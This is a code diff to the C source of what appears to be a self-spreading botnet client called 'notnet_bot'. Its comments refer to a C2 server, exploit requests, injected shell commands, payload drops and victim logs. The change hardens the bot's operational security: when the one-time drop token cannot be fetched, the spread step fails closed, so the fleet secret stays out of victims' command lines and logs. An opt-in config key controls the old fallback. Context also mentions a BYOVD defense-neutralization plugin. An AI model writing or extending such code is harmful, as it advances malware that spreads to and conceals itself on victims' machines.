@@ -1285,10 +1285,14 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
  * token from the C2 (GET /bot/token; http_get_url appends ?secret= so the
  * token endpoint itself stays fleet-authenticated) and puts THAT in the
  * URL: /bot/notnet?token=<tok>. The C2 consumes the token on first use.
- * If the token fetch fails (older C2, offline lab), fall back to the
- * legacy ?secret= form so drops still work.
- * Returns 0 when a token URL was built, 1 on fallback; dl_url is always
- * populated (or empty on hard failure). */
+ /* #314: the legacy ?secret= fallback re-opens the CWE-200 exposure
+  * #190 closed (fleet secret in the injected shell command, exploit
+  * request body and victim logs) and the secret authenticates every
+  * bot channel (#164/#167/#173) — so it is OPT-IN via
+  * allow_secret_fallback=1 and otherwise FAILS CLOSED: the drop is
+  * skipped and the caller (all ten, #312) reports failure. Returns
+  * 0 on a token URL; 1 on the opt-in legacy fallback; -1 on hard
+  * failure (dl_url emptied). */
 int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz) {
     if (!bot || !dl_url || sz == 0) return -1;
     dl_url[0] = '\0';
@@ -1316,7 +1320,13 @@ int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz) {
         }
     }
 fallback:
-    log_warn("SPREAD: drop-token fetch failed, falling back to ?secret= (#190)");
+    if (!bot->allow_secret_fallback) {
+        /* #314: fail closed — no opt-in, no secret in the URL. */
+        log_error("SPREAD: drop-token fetch failed and allow_secret_fallback=0, drop aborted");
+        dl_url[n] = '\0';
+        return -1;
+    }
+    log_warn("SPREAD: drop-token fetch failed, using OPT-IN legacy ?secret= fallback (#190/#314)");
     {
         char q[256];
         int qlen = snprintf(q, sizeof(q), "?secret=%s", bot->secret);
@@ -4818,6 +4828,12 @@ int load_config(notnet_bot_t *bot, const char *path) {
              * built-in plugin registry is bootstrapped at boot and the
              * `plugin` C2 command dispatches plugins by name. */
             bot->plugin_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "allow_secret_fallback") == 0) {
+            /* #314: opt-in gate for the legacy ?secret= drop-URL
+             * fallback. Default 0 — token-endpoint failure fails
+             * closed instead of re-embedding the fleet secret in
+             * victim command lines (CWE-200). */
+            bot->allow_secret_fallback = (atoi(value) != 0);
         } else if (strcmp(key, "byovd_guard") == 0) {
             /* SECURITY FIX (#94): BYOVD defense-neutralization guard.
              * The byovd plugin is a defensive-only research scaffold
